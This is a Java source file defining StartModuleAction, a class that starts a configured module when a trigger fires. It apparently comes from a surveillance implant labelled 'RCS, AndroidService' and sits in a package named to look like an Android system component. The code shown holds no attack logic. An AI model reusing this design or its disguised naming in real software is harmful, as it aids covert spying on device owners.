/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StartAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.action;

import com.android.syssetup.Trigger;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfAction;
import com.android.syssetup.manager.ManagerModule;
import com.android.syssetup.util.Check;

/**
 * The Class StartAgentAction.
 */
public class StartModuleAction extends ModuleAction {
	private static final String TAG = "StartModuleAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new start agent action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public StartModuleAction(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + moduleId);//$NON-NLS-1$
		}
		final ManagerModule moduleManager = ManagerModule.self();

		moduleManager.start(moduleId, trigger);
		return true;
	}

}
